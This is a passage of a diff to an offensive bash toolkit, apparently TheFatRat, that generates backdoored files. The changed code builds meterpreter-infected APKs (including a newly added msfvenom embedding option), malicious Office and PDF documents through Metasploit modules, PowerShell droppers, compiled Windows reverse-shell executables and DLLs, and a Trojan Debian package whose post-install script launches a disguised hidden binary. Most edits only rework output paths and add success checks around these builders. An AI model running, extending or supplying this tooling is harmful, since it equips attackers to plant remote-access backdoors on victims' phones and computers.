-                echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.docm "
+                echo -e $yellow"  Backdoor doc Saved To : $output/$fira.docm "
                 echo -e
                 read -rsp $'Press [ENTER] key to return to menu\n' -n 1 key
           microsploit
@@ -3763,13 +3884,13 @@ fi
                 done
                 rm -rf $path/temp/xterm.tmp >/dev/null 2>&1
          	echo ""
-    			mv ~/.msf4/local/$fira.docm $path/output/$fira.docm >>$msploit 2>&1
+    			mv ~/.msf4/local/$fira.docm $output/$fira.docm >>$msploit 2>&1
         	echo -e $okegreen""
 
-                fidoc=$path/output/$fira.docm
+                fidoc=$output/$fira.docm
                 if [ -f "$fidoc" ]
                 then
-                echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.docm "
+                echo -e $yellow"  Backdoor doc Saved To : $output/$fira.docm "
                 echo -e
                 read -rsp $'Press [ENTER] key to return to menu\n' -n 1 key
           microsploit
@@ -3813,12 +3934,12 @@ fi
                 done
                 rm -rf $path/temp/xterm.tmp >/dev/null 2>&1
          	echo ""
-         	mv ~/.msf4/local/$fira.docm $path/output/$fira.docm >>$msploit 2>&1
+         	mv ~/.msf4/local/$fira.docm $output/$fira.docm >>$msploit 2>&1
          	echo -e $okegreen""
-         	fidoc=$path/output/$fira.docm
+         	fidoc=$output/$fira.docm
                 if [ -f "$fidoc" ]
                 then
-                echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.docm "
+                echo -e $yellow"  Backdoor doc Saved To : $output/$fira.docm "
                 echo -e
                 read -rsp $'Press [ENTER] key to return to menu\n' -n 1 key
           microsploit
@@ -3909,10 +4030,10 @@ fi
                 done
                 rm -rf $path/temp/xterm.tmp >/dev/null 2>&1
          	echo -e $okegreen""
-         	fidoc=$path/output/$fira.odt
+         	fidoc=$output/$fira.odt
                 if [ -f "$fidoc" ]
                 then
-                echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.odt "
+                echo -e $yellow"  Backdoor doc Saved To : $output/$fira.odt "
                 echo -e
                 read -rsp $'Press [ENTER] key to return to menu\n' -n 1 key
           microsploit
@@ -4002,10 +4123,10 @@ fi
                 rm -rf $path/temp/xterm.tmp >/dev/null 2>&1
          	echo ""
          	echo -e $okegreen""
-         	fidoc=$path/output/$fira.odt
+         	fidoc=$output/$fira.odt
                 if [ -f "$fidoc" ]
                 then
-                echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.odt "
+                echo -e $yellow"  Backdoor doc Saved To : $output/$fira.odt "
                 echo -e
                 read -rsp $'Press [ENTER] key to return to menu\n' -n 1 key
           microsploit
@@ -4026,7 +4147,47 @@ microsploit
 ;;
 esac
 }
+function tstapk() {
+rm -rf "$path/temp/tstapk" >/dev/null 2>&1
+rm -rf "$path/temp/tstapk.apk" >/dev/null 2>&1
+$apktool d "$path/temp/app.apk" -o "$path/temp/tstapk" >/dev/null 2>&1
+if [[ ! -d "$path/temp/tstapk" ]]
+then
+echo -e "$red""Error"
+echo -e "$red""Apktool in unable to decompile this apk"
+echo ""
+read -rsp $'Press [ENTER] key to return to menu\n' -n 1 key	
+clear
+menu
+fi
 
+# Testing using aapt
+$apktool b "$path/temp/tstapk" -o "$path/temp/tstapk.apk" >/dev/null 2>&1	
+if [[ ! -f "$path/temp/tstapk.apk" ]]
+then
+$apktool b --use-aapt2 "$path/temp/tstapk" -o "$path/temp/tstapk.apk" >/dev/null 2>&1
+if [[ ! -f "$path/temp/tstapk.apk" ]]
+then
+echo -e "$red""Error"
+echo -e "$red""Apktool in unable to recompile this apk"
+echo -e "$okegreen"""
+read -rsp $'Press [ENTER] key to return to menu\n' -n 1 key	
+clear
+menu
+else
+echo -e "$okegreen""Done"
+echo ""	
+encd="--use-aapt2"
+rm -rf "$path/temp/tstapk" >/dev/null 2>&1
+rm -rf "$path/temp/tstapk.apk" >/dev/null 2>&1
+fi
+encd=""
+echo -e "$okegreen""Done"
+echo ""	
+rm -rf "$path/temp/tstapk" >/dev/null 2>&1
+rm -rf "$path/temp/tstapk.apk" >/dev/null 2>&1
+fi
+}
 #EMBEDBACKDOORAPK
 function embedapk() {
 resize -s 45 86 > /dev/null
@@ -4090,6 +4251,8 @@ menu
   fi
 
 echo ""
+echo -ne "$okegreen""Testing your apk before next step ..."
+tstapk
 #go to payload android menu
 pldand
 echo ""
@@ -4098,10 +4261,11 @@ spinlong
 echo ""
 sleep 1
 #select tool to build apk rat
-echo -e $orange "+------------------------------+"
-echo -e $orange "|$white [$okegreen 1$white ]$yellow Use Backdoor-apk 0.2.2$orange |"
-echo -e $orange "|$white [$okegreen 2$white ]$yellow Use old Fatrat method$orange  |"
-echo -e $orange "+------------------------------+"
+echo -e $orange "+-------------------------------------+"
+echo -e $orange "|$white [$okegreen 1$white ]$yellow Use Backdoor-apk 0.2.4a$orange       |"
+echo -e $orange "|$white [$okegreen 2$white ]$yellow Use old Fatrat method$orange         |"
+echo -e $orange "|$white [$okegreen 3$white ]$yellow Use MsfVenom Embedded method$orange  |"
+echo -e $orange "+-------------------------------------+"
 echo ""
 echo -ne $cyan "Select Tool to create apk : ";tput sgr0
 read apkto
@@ -4114,11 +4278,12 @@ gboor2
 # remove any existent apkconfig file and create a new one with the data for backdoor_apk to read
 rm -f $apkconfig >/dev/null 2>&1
 touch $apkconfig
-echo "app.apk" > $apkconfig
-echo "Rat.apk" >> $apkconfig
+echo "$path/temp/app.apk" > $apkconfig
+echo "$path/temp/Rat.apk" >> $apkconfig
 echo $payload >> $apkconfig
 echo $yourip >> $apkconfig
 echo $yourport >> $apkconfig
+echo "$encod" >> $apkconfig
 ./backdoor_apk
 echo ""
 sleep 2
@@ -4182,6 +4347,7 @@ echo -e $okegreen ""
 
 #Starting the process of inserting the payload into original apk file
 ruby $apkembed $path/temp/app.apk
+apktool b $encd -o app_backdoored.apk temp/original
 sleep 2
 
 echo -e $okegreen ""
@@ -4209,18 +4375,18 @@ fi
 #looking if already exists a previous backdoor apk created and renaming it
 
 ren=`shuf -i 1-1000 -n 1`
-back=$path/backdoored/app_backdoored.apk
+back=$output/app_backdoored.apk
 if [ -f "$back" ]
 then
-mv $path/backdoored/app_backdoored.apk $path/backdoored/app_backdoored_$ren.apk >>$log 2>&1
+mv $output/app_backdoored.apk $output/app_backdoored_$ren.apk >>$log 2>&1
 echo -e $yellow ""
 echo "[!] FatRat Detected that you already had a previous created backdoor
-file in ($path/backdoored/) with the name app_backdoored.apk ."
+file in ($output/) with the name app_backdoored.apk ."
 echo -e $okegreen ""
 echo "[✔] FatRat have renamed your old backdoor to app_backdoored_$ren.apk"
 
 # Moving apk backdoor to final destination
-mv $path/temp/app_backdoored.apk $path/backdoored/app_backdoored.apk >>$log 2>&1
+mv $path/temp/app_backdoored.apk $output/app_backdoored.apk >>$log 2>&1
 
 # Removing temp files
 rm -rf temp/* > /dev/null 2>&1
@@ -4228,11 +4394,11 @@ else
 
 
 # Moving apk backdoor to final destination
-mv $path/temp/app_backdoored.apk $path/backdoored/app_backdoored.apk >>$log 2>&1
+mv $path/temp/app_backdoored.apk $output/app_backdoored.apk >>$log 2>&1
 rm -rf temp/* > /dev/null 2>&1
 fi
 
-varopt="$path/backdoored/app_backdoored.apk"
+varopt="$output/app_backdoored.apk"
 if [ ! -f $varopt ]; then
 echo -e $red ""
 echo "[x] There was an error copying your Rat app to final destination .
@@ -4245,13 +4411,63 @@ fi
 
 echo -e $green ""
 echo "Your payload has been successfully & signed and it is located at :
- $path/backdoored/app_backdoored.apk"
+ $output/app_backdoored.apk"
 sleep 2
 echo -e $okegreen ""
 echo "[*] Removing temporary files"
 sleep 2
 rm -rf $path/temp/* >/dev/null 2>&1
 echo "[✔] Done!"
+echo ""
+crlst
+;;
+3)
+echo ""
+echo "---------Backdooring your apk with MSFVenom-----------"
+echo ""
+$msfvenom -x $apkt -p $payload LHOST=$yourip LPORT=$yourport -o temp/backand.apk
+echo ""
+echo "-----------------------Finished-----------------------"
+echo ""
+if [[ ! -f "temp/backand.apk" ]]
+then
+echo "MSFVenom was unable to embed a payload on your apk"
+echo ""
+echo -n "Press ENTER key to return to menu"
+read rsp
+rm -rf temp/* > /dev/null 2>&1
+clear && menu
+fi
+
+ren=`shuf -i 1-1000 -n 1`
+back=$output/app_backdoored.apk
+if [ -f "$back" ]
+then
+mv $output/app_backdoored.apk $output/app_backdoored_$ren.apk >>$log 2>&1
+echo -e $yellow ""
+echo "[!] FatRat Detected that you already had a previous created backdoor
+file in ($output/) with the name app_backdoored.apk ."
+echo -e $okegreen ""
+echo "[✔] FatRat have renamed your old backdoor to app_backdoored_$ren.apk"
+
+# Moving apk backdoor to final destination
+mv $path/temp/backand.apk $output/app_backdoored.apk >>$log 2>&1
+
+# Removing temp files
+rm -rf temp/* > /dev/null 2>&1
+crlst
+else
+
+
+# Moving apk backdoor to final destination
+mv $path/temp/backand.apk $output/app_backdoored.apk >>$log 2>&1
+rm -rf temp/* > /dev/null 2>&1
+echo ""
+echo "Your backdoored apk can be found in : $output/app_backdoored.apk"
+echo ""
+crlst
+fi
+echo "Your backdoored apk can be found in : $output/app_backdoored.apk"
 echo ""
 crlst
 ;;
@@ -4351,10 +4567,19 @@ spinlong
 					cat powershell_attack.txt
 					sleep 2
 					rm unicorn.rc
-					mv powershell_attack.txt output/$fira.bat
+					mv powershell_attack.txt $output/$fira.bat
 					echo ""
 					echo -e $okegreen""
-					echo -e "Backdoor Saved To output Folder "
+					if [[ -f "$output/$fira.bat" ]]
+					then
+					echo -e "$okegreen""Backdoor Saved To : $output/$fira.bat"
+					else
+					echo -e "$red""There was an error creating the baackdoor"
+					fi
+					echo ""
+					echo -ne "$yellow""  Press [ENTER] to continue ......... "
+					read continue
+					
 PwnWinds
 ;;
 2)
@@ -4412,16 +4637,19 @@ spinlong
 					echo;spinlong;echo
 					sleep 1
 					echo
-					#dmcs $bcom -o "output/$fira.exe" > /dev/null 2>&1
+					mcs $bcom -o "$output/$fira.exe" > /dev/null 2>&1
 					rm unicorn.rc powershell_attack.txt
 					echo ""
-					echo -e $okegreen""
-					echo -e $white"Programr Saved To $bcom "
+					if [[ -f "$output/$fira.exe" ]]
+					then
+					echo -e "$okegreen""Backdoor Saved To : $output/$fira.exe"
+					else
+					echo -e "$red""There was an error creating the backdoor"
+					fi
 					echo ""
-					echo -e $red"Compiled the source using monodevelop in your linux system"
-					echo
-					echo -ne "  Press [ENTER] key to continue ......... "
+					echo -ne "$yellow""  Press [ENTER] to continue ......... "
 					read continue
+					
 PwnWinds
 
 
@@ -4476,17 +4704,21 @@ spinlong
 
 					sed s/SERVER/$s0/g $apache > $apachecom
 					echo
-					$COMPILER -Wall -mwindows icons/icon.res $apachecom -o "output/$fira.exe" > /dev/null 2>&1
+					$COMPILER -Wall -mwindows $apachecom -o "$output/$fira.exe" > /dev/null 2>&1
 					rm unicorn.rc  $apachecom $out
 					mv powershell_attack.txt $apache2
 					sleep 2
 					echo ""
-					echo -e $okegreen""
-					echo -e "  Backdoor Saved To output Folder "
+					if [[ -f "$output/$fira.exe" ]]
+					then
+					echo -e "$okegreen""Backdoor Saved To : $output/$fira.exe"
+					else
+					echo -e "$red""There was an error creating the backdoor"
+					fi
 					echo ""
-					echo -ne "  Press [ENTER] key to continue ......... "
+					echo -ne "$yellow""  Press [ENTER] to continue ......... "
 					read continue
-PwnWinds
+				PwnWinds
 
 ;;
 4)
@@ -4539,16 +4771,20 @@ spinlong
 
 					sed s/PAYLOAD/$s0\ $s1\ $s2\ $s3\ $s4/g $C > $paycom
 					echo
-					$COMPILER -Wall -mwindows icons/icon.res $paycom -o "output/$fira.exe" > /dev/null 2>&1
+					$COMPILER -Wall -mwindows $paycom -o "$output/$fira.exe" > /dev/null 2>&1
 					rm unicorn.rc powershell_attack.txt $paycom
 					sleep 2
 					echo ""
-					echo -e $okegreen""
-					echo -e "  Backdoor Saved To output Folder "
+					if [[ -f "$output/$fira.exe" ]]
+					then
+					echo -e "$okegreen""Backdoor Saved To : $output/$fira.exe"
+					else
+					echo -e "$red""There was an error creating the backdoor"
+					fi
 					echo ""
-					echo -ne "  Press [ENTER] key to continue ......... "
+					echo -ne "$yellow""  Press [ENTER] to continue ......... "
 					read continue
-PwnWinds
+					PwnWinds
 
 ;;
 5)
@@ -4586,9 +4822,10 @@ fi
 					echo ""
 					echo -ne $okegreen " Located Original PDF file for embed (example:/TheFatRat/PE/original.pdf) :" ;tput sgr0
 					read embedpdf
-if [ -z "$embedpdf" ]; then
+if [[ -z "$embedpdf" ]]; then
 embedpdf="$path/PE/original.pdf"
-fipldwin
+fi
+pldwin
 					spinlong
 					echo ""
 					echo ""
@@ -4607,20 +4844,25 @@ fipldwin
 
 					sed s/PAYLOAD/$s0\ $s1\ $s2\ $s3\ $s4/g $C > $pdfcom
 					echo
-					$COMPILER -Wall -mwindows icons/icon.res $pdfcom -o "$path/output/backdoor_for_pdf.exe" > /dev/null 2>&1
+					$COMPILER -Wall -mwindows $pdfcom -o "$output/backdoor_for_pdf.exe" > /dev/null 2>&1
 					sleep 2
 					echo " Wait for embed exe to pdf ....  "
-					xterm -T " TheFatRat < PDF BUILDER > " -geometry 110x23 -e "$msfconsole -x 'use windows/fileformat/adobe_pdf_embedded_exe; set EXE::Custom $path/output/backdoor_for_pdf.exe; set FILENAME $fira.pdf; set INFILENAME $embedpdf; exploit; exit -y'" > /dev/null 2>&1
+					xterm -T " TheFatRat < PDF BUILDER > " -geometry 110x23 -e "$msfconsole -x 'use windows/fileformat/adobe_pdf_embedded_exe; set EXE::Custom $output/backdoor_for_pdf.exe; set FILENAME $fira.pdf; set INFILENAME $embedpdf; exploit; exit -y'" > /dev/null 2>&1
 					echo ""
-					mv ~/.msf4/local/$fira.pdf $path/output/$fira.pdf
-					rm unicorn.rc powershell_attack.txt
-					echo -e $okegreen""
-					echo -e $yellow"  Backdoor PDF Saved To output Folder "
+					mv ~/.msf4/local/$fira.pdf $output/$fira.pdf
+					rm unicorn.rc > /dev/null 2>&1
+					rm  powershell_attack.txt > /dev/null 2>&1
+					if [[ -f "$output/$fira.pdf" ]]
+					then
+					echo -e "$okegreen""Backdoor PDF Saved To : $output/$fira.pdf"
+					else
+					echo -e "$red""There was an error creating the backdoor"
+					fi
 					echo ""
-					echo -ne $okegreen"  Press [ENTER] key to continue ......... "
+					echo -ne "$yellow""  Press [ENTER] to continue ......... "
 					read continue
-PwnWinds
-fi
+					PwnWinds
+
 ;;
 6)
         echo ""
@@ -4836,13 +5078,20 @@ fi
         echo ' }' >> $reverse1
         echo ' return 0;' >> $reverse1
         echo '}' >> $reverse1
-        $COMPILER $reverse1 -o output/$fira.exe -lws2_32 -mwindows
+        $COMPILER $reverse1 -o $output/$fira.exe -lws2_32 -mwindows
 	      echo
         echo -e $yellow " [+]"$okegreen"Compiling Binary Done  ";tput sgr0
         rm $reverse1
-	      echo -ne $yellow " Press Enter key to Contiune ..."
-        read aw
-	      PwnWinds
+       if [[ -f "$output/$fira.exe" ]]
+					then
+					echo -e "$okegreen""Backdoor Saved To : $output/$fira.exe"
+					else
+					echo -e "$red""There was an error creating the backdoor"
+					fi
+					echo ""
+					echo -ne "$yellow""  Press [ENTER] to continue ......... "
+					read continue
+	      	      PwnWinds
 
 ;;
 7)
@@ -4960,13 +5209,20 @@ fi
       echo '    function();'>>$stag
       echo '    return 0;'>>$stag
       echo '}' >> $stag
-      $COMPILER $stag -o output/$fira.exe -lws2_32
+      $COMPILER $stag -o $output/$fira.exe -lws2_32
       echo
       echo -e $yellow " [+]"$okegreen"Compiling Binary Done  ";tput sgr0
       rm $stag
-      echo -ne $yellow " Press Enter key to Contiune ..."
-      read aw
-      PwnWinds
+if [[ -f "$output/$fira.exe" ]]
+					then
+					echo -e "$okegreen""Backdoor Saved To : $output/$fira.exe"
+					else
+					echo -e "$red""There was an error creating the backdoor"
+					fi
+					echo ""
+					echo -ne "$yellow""  Press [ENTER] to continue ......... "
+					read continue
+           PwnWinds
 
 ;;
 
@@ -5086,13 +5342,20 @@ fi
 	echo '    function();'>> $dllcustom
 	echo '    return 0;'>> $dllcustom
 	echo '}' >> $dllcustom
-      $COMPILER $dllcustom -o output/$fira.dll -lws2_32 -shared
+      $COMPILER $dllcustom -o $output/$fira.dll -lws2_32 -shared
       echo
-      strip output/$fira.dll
+      strip $output/$fira.dll
             rm $dllcustom
       echo -e $yellow " [+]"$okegreen" Compiling C to dll done , chek in output folder  ";tput sgr0
-      echo -ne $yellow " Press Enter key to Contiune ..."
-      read aw
+     if [[ -f "$output/$fira.dll" ]]
+					then
+					echo -e "$okegreen""Backdoor Saved To : $output/$fira.dll"
+					else
+					echo -e "$red""There was an error creating the backdoor"
+					fi
+					echo ""
+					echo -ne "$yellow""  Press [ENTER] to continue ......... "
+					read continue
       PwnWinds
 
 ;;
@@ -5174,7 +5437,7 @@ echo -e "   [desc] - Embed a Trojan Into Deb PKG + Run Post Install       "
   echo " sudo chmod 2755 /usr/lib/libssll/bash && /usr/lib/libssll/bash & " >> tools/trodebi_temp/work/DEBIAN/postinst
   chmod 755 tools/trodebi_temp/work/DEBIAN/postinst
   dpkg-deb --build tools/trodebi_temp/work
-  mv tools/trodebi_temp/work.deb output/$fira.deb
+  mv tools/trodebi_temp/work.deb $output/$fira.deb
   rm -rf tools/trodebi_temp/work/* >> /dev/null 2>&1
   rm -rf tools/trodebi_temp/evil/* >> /dev/null 2>&1
   rm -rf tools/trodebi_temp/original/* >> /dev/null 2>&1
@@ -5283,7 +5546,7 @@ echo -e $cyan"==================================================================
 echo -e $cyan""
 # Set Output filename
 echo
-echo -n -e "TYPE THE DESIRED OUTPUT FILENAME : $okegreen" ;
+echo -n -e "TYPE THE DESIRED OUTPUT FILENAME (APP.exe) : $okegreen" ;
 read OUTPUTNAME
 echo ""
 echo ""
@@ -5457,7 +5720,7 @@ echo '}' >> $path/temp/build.c
 
 ls icons/icon.res >/dev/null 2>&1
 if [ $? -eq 0 ]; then
-    $COMPILER -Wall -mwindows icons/icon.res $path/temp/build.c -o "$OUTPUTNAME"
+    $COMPILER -Wall -mwindows $path/temp/build.c -o "$OUTPUTNAME"
 else
     $COMPILER -Wall -mwindows $path/temp/build.c -o "$OUTPUTNAME"
 fi
@@ -5615,50 +5878,49 @@ menu () {
             yourport=""
         fi
             if [ -z "$yourip" ]; then
-  				  read -p '  Set LHOST IP: ' yourip
+  		read -p '  Set LHOST IP: ' yourip
             fi
-            echo -e $okegreen ""
+            	echo -e $okegreen ""
             if [ -z "$yourport" ]; then
-            read -p '  Set LPORT: ' yourport
+            	read -p '  Set LPORT: ' yourport
             fi
-            read -p '  Please enter the base name for output files : ' fira
-            invalid
+            	read -p '  Please enter the base name for output files : ' fira
+            	invalid
             if [ $err == "1" ]
             then
-              echo -e $okegreen ""
-              echo -n "Press [ENTER] key to return to menu ."
-              read inp
-              menu
+              	echo -e $okegreen ""
+              	echo -n "Press [ENTER] key to return to menu ."
+              	read inp
+              	menu
             fi
-            			selexe
-       	  			pldbkf
-            			echo ""
-    				gboor
-    				spinlong2
-    				echo ""
-    				echo -e $okegreen""
-    				$backdoor -f $exef -s $payload -H $yourip -P $yourport -o output/$fira.exe
-  backout="$path/backdoored/output/$fira.exe"
-   if [ ! -f "$backout" ]
-  then
-  echo -e $red "There was a problem in the creation of your backdoor file using backdoor-factory"
-  echo -e $red "One of the problable causes is that the EXE file you selected is not yet supported"
-  echo ""
-  echo -e $okegreen "Press [ENTER] key to continue to main menu "
-  read mmenu
-  clear
-  menu
-  else
-  echo ""
-  echo -e $cyan "Your Rat was saved To :"
-  echo -e $cyan "$path/backdoored/output/$fira.exe"
-  echo ""
-  bkflst
-    				read bebeku
-    				clear
-    				menu
-
-  fi
+            	selexe
+       	  	pldbkf
+            	echo ""
+    		gboor
+    		spinlong2
+    		echo ""
+    		echo -e $okegreen""
+    		$backdoor -f $exef -s $payload -H $yourip -P $yourport -o $output/$fira.exe
+  		backout="$output/$fira.exe"
+		  if [ ! -f "$backout" ]
+		  then
+			  echo -e $red "There was a problem in the creation of your backdoor file using backdoor-factory"
+			  echo -e $red "One of the problable causes is that the EXE file you selected is not yet supported"
+			  echo ""
+			  echo -e $okegreen "Press [ENTER] key to continue to main menu "
+			  read mmenu
+			  clear
+			  menu
+		  else
+			  echo ""
+			  echo -e $cyan "Your Rat was saved To :"
+			  echo -e $cyan "$output/$fira.exe"
+			  echo ""
+			  bkflst
+			  read bebeku
+			  clear
+			  menu
+		  fi
       elif test $fatrat == '5'
         then
         embedapk
@@ -5705,7 +5967,7 @@ menu () {
         echo
         echo -ne $okegreen"  mb or kb : " ;tput sgr0
         read type
-        python $pump $tampfile $size -$type > /dev/null 2>&1
+        python2 $pump $tampfile $size -$type > /dev/null 2>&1
         echo
         echo -ne $yellow"  Finished Pumping ... "
         read oke
@@ -5723,39 +5985,35 @@ menu () {
         echo ""
         echo -ne $red"  [>] $cyan Are you sure you want to clean payload folders? [y/N] : "
         read clean
-        if [ $clean == "y" ] ;
-          then
-        echo ""
-          else
-        clear
-        menu
-          fi
-        echo -e $red"  [*] $cyan Cleaning $path/temp/"
-        rm $path/temp/* >/dev/null 2>&1
-        sleep 2
-        echo ""
-        echo -e $red"  [*] $cyan Cleaning $path/autorun/"
-        rm $path/autorun/* >/dev/null 2>&1
-        sleep 2
-        echo ""
-        echo -e $red"  [*] $cyan Cleaning $path/output/"
-        rm $path/output/* >/dev/null 2>&1
-        sleep 2
-        echo ""
-        echo -e $red"  [*] $cyan Cleaning $path/config/listeners/"
-        rm $path/config/listeners/* >/dev/null 2>&1
-        sleep 2
-        echo ""
-        echo -e $red"  [*] $cyan Cleaning $path/*.exe or apk"
-        rm *.exe *.apk  >/dev/null 2>&1
-        sleep 2
-        echo ""
-        echo -e $red"  [*] $cyan Cleaning $path/backdoored/output/"
-        rm $path/backdoored/output/* >/dev/null 2>&1
-        echo ""
-        echo -ne $red"  [*] $cyan Folders cleaned, press [ENTER] key to return to the main menu."
-        read anjeng
-        menu
+      if [ $clean == "n" ] ;
+        then
+		clear
+      		menu
+        else
+	      echo -ne $red"\n  [*] $cyan Cleaning $path/temp/ \n"
+	      rm $path/temp/* >/dev/null 2>&1
+	      sleep 2
+	      echo ""
+	      echo -e $red"  [*] $cyan Cleaning $path/autorun/ "
+	      rm $path/autorun/* >/dev/null 2>&1
+	      sleep 2
+	      echo ""
+	      echo -e $red"  [*] $cyan Cleaning $output/ "
+	      rm $output/* >/dev/null 2>&1
+	      sleep 2
+	      echo ""
+	      echo -e $red"  [*] $cyan Cleaning $path/config/listeners/ "
+	      rm $path/config/listeners/* >/dev/null 2>&1
+	      sleep 2
+	      echo ""
+	      echo -e $red"  [*] $cyan Cleaning $path/*.exe or apk"
+	      rm *.exe *.apk  >/dev/null 2>&1
+	      sleep 2
+	      echo ""
+	      echo -ne $red"  [*] $cyan Folders cleaned, press [ENTER] key to return to the main menu."
+	      read anjeng
+	      menu
+        fi
 
       elif test $fatrat == '15'
         then
@@ -5864,50 +6122,49 @@ echo
           yourport=""
       fi
           if [ -z "$yourip" ]; then
-				  read -p '  Set LHOST IP: ' yourip
+		  read -p '  Set LHOST IP: ' yourip
           fi
-          echo -e $okegreen ""
+          	echo -e $okegreen ""
           if [ -z "$yourport" ]; then
-          read -p '  Set LPORT: ' yourport
+          	read -p '  Set LPORT: ' yourport
           fi
-          read -p '  Please enter the base name for output files : ' fira
-          invalid
+          	read -p '  Please enter the base name for output files : ' fira
+          	invalid
           if [ $err == "1" ]
           then
-            echo -e $okegreen ""
-            echo -n "Press [ENTER] key to return to menu ."
-            read inp
-            menu
+            	echo -e $okegreen ""
+            	echo -n "Press [ENTER] key to return to menu ."
+            	read inp
+            	menu
           fi
-          			selexe
-     	  			pldbkf
-          			echo ""
-  				gboor
-  				spinlong2
-  				echo ""
-  				echo -e $okegreen""
-  				$backdoor -f $exef -s $payload -H $yourip -P $yourport -o output/$fira.exe
-backout="$path/backdoored/output/$fira.exe"
- if [ ! -f "$backout" ]
-then
-echo -e $red "There was a problem in the creation of your backdoor file using backdoor-factory"
-echo -e $red "One of the problable causes is that the EXE file you selected is not yet supported"
-echo ""
-echo -e $okegreen "Press [ENTER] key to continue to main menu "
-read mmenu
-clear
-menu
-else
-echo ""
-echo -e $cyan "Your Rat was saved To :"
-echo -e $cyan "$path/backdoored/output/$fira.exe"
-echo ""
-bkflst
-  				read bebeku
-  				clear
-  				menu
+          	selexe
+     	  	pldbkf
+          	echo ""
+  	  	gboor
+  	  	spinlong2
+  	  	echo ""
+  	  	echo -e $okegreen""
+  	  	$backdoor -f $exef -s $payload -H $yourip -P $yourport -o $output/$fira.exe
+	  	backout="$output/$fira.exe"
+		 if [ ! -f "$backout" ]; then
+			echo -e $red "There was a problem in the creation of your backdoor file using backdoor-factory"
+			echo -e $red "One of the problable causes is that the EXE file you selected is not yet supported"
+			echo ""
+			echo -e $okegreen "Press [ENTER] key to continue to main menu "
+			read mmenu
+			clear
+			menu
+		else
+			echo ""
+			echo -e $cyan "Your Rat was saved To :"
+			echo -e $cyan "$output/$fira.exe"
+			echo ""
+			bkflst
+			read bebeku
+			clear
+			menu
 
-fi
+		fi
     elif test $fatrat == '5'
       then
       embedapk
@@ -5954,7 +6211,7 @@ elif test $fatrat == '11'
       echo
       echo -ne $okegreen"  mb or kb : " ;tput sgr0
       read type
-      python $pump $tampfile $size -$type > /dev/null 2>&1
+      python2 $pump $tampfile $size -$type > /dev/null 2>&1
       echo
       echo -ne $yellow"  Finished Pumping ... "
       read oke
@@ -5972,40 +6229,35 @@ elif test $fatrat == '11'
       echo ""
       echo -ne $red"  [>] $cyan Are you sure you want to clean payload folders? [y/N] : "
       read clean
-      if [ $clean == "y" ] ;
+      if [ $clean == "n" ] ;
         then
-      echo ""
+		clear
+      		menu
         else
-      clear
-      menu
+	      echo -ne $red"\n  [*] $cyan Cleaning $path/temp/ \n"
+	      rm $path/temp/* >/dev/null 2>&1
+	      sleep 2
+	      echo ""
+	      echo -e $red"  [*] $cyan Cleaning $path/autorun/ "
+	      rm $path/autorun/* >/dev/null 2>&1
+	      sleep 2
+	      echo ""
+	      echo -e $red"  [*] $cyan Cleaning $output/ "
+	      rm $output/* >/dev/null 2>&1
+	      sleep 2
+	      echo ""
+	      echo -e $red"  [*] $cyan Cleaning $path/config/listeners/ "
+	      rm $path/config/listeners/* >/dev/null 2>&1
+	      sleep 2
+	      echo ""
+	      echo -e $red"  [*] $cyan Cleaning $path/*.exe or apk"
+	      rm *.exe *.apk >/dev/null 2>&1
+	      sleep 2
+	      echo ""
+	      echo -ne $red"  [*] $cyan Folders cleaned, press [ENTER] key to return to the main menu."
+	      read anjeng
+	      menu
         fi
-      echo -e $red"  [*] $cyan Cleaning $path/temp/"
-      rm $path/temp/* >/dev/null 2>&1
-      sleep 2
-      echo ""
-      echo -e $red"  [*] $cyan Cleaning $path/autorun/"
-      rm $path/autorun/* >/dev/null 2>&1
-      sleep 2
-      echo ""
-      echo -e $red"  [*] $cyan Cleaning $path/output/"
-      rm $path/output/* >/dev/null 2>&1
-      sleep 2
-      echo ""
-      echo -e $red"  [*] $cyan Cleaning $path/config/listeners/"
-      rm $path/config/listeners/* >/dev/null 2>&1
-      sleep 2
-      echo ""
-      echo -e $red"  [*] $cyan Cleaning $path/*.exe or apk"
-      rm *.exe *.apk  >/dev/null 2>&1
-      sleep 2
-      echo ""
-      echo -e $red"  [*] $cyan Cleaning $path/backdoored/output/"
-      rm $path/backdoored/output/* >/dev/null 2>&1
-      echo ""
-      echo -ne $red"  [*] $cyan Folders cleaned, press [ENTER] key to return to the main menu."
-      read anjeng
-      menu
-
     elif test $fatrat == '15'
       then
       firefox https://github.com/Screetsec/TheFatRat/blob/master/README.md
